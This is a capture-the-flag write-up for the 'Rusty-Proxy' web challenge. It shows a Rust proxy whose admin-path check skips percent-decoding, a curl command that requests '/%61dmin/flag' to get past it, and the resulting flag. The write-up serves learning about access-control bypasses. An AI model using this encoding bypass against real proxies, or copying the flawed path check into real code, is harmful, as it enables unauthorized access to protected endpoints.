# Rusty-Proxy
> OTP: "I just vibecoded a highly secure reverse proxy using rust, I hope it works properly."

> `http://chals.bitskrieg.in:25001`

> Catergory: Web Exp

## Analyzing
We have received a web from this challenge. However, there's no way to exploit it through dev tools. Checking the source code of this web site, we have found something special here:
- First, in `proxy/src/main.rs`, we have found a function named `is_path_allowed`:
    ```rust
    fn is_path_allowed(path: &str) -> bool {
        let normalized = path.to_lowercase();
        if normalized.starts_with("/admin") {
            return false;
        }
        true
    }
    ```

    The function only calls `.to_lowercase()` on the raw path string — it performs no URL decoding / percent-decoding before checking whether the path starts with `/admin`
- Checking the backend folder, at `proxy/backend/server.py`, we have found this line:
    ```python
    @app.route('/admin/flag')
    def vault():
        return jsonify({"flag": FLAG})
    ```
So, our target is get the flag from secret endpoint at `/admin/flag` on backend throughout proxy at `http://chals.bitskrieg.in:25001`

## How to get flag?
Base on the analyzing, we can observed that:
- A request to `/%61dmin/flag` is passed through because the raw string starts with `/%61`, not `/admin`.
- But once the request reaches the Flask/Cheroot backend, it decodes `%61 → a`, treating the path as `/admin/flag` and serving the protected resource.

To exploit, we can send a HTTP GET to proxy with path containing `%61` instead of `a` in `admin`. We can use `curl` command to do this:
```bash
curl -s -i -H 'Host: backend' 'http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag'
```

When we send this line:
```
curl sends:  GET /%61dmin/flag  (with Host: backend)
     ↓
Proxy checks: does "/%61dmin/flag" start with "/admin"? → NO → allowed ✅
     ↓
Backend receives: /%61dmin/flag → Flask decodes %61 → /admin/flag → returns flag 🚩
```

The flag is **`BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}`**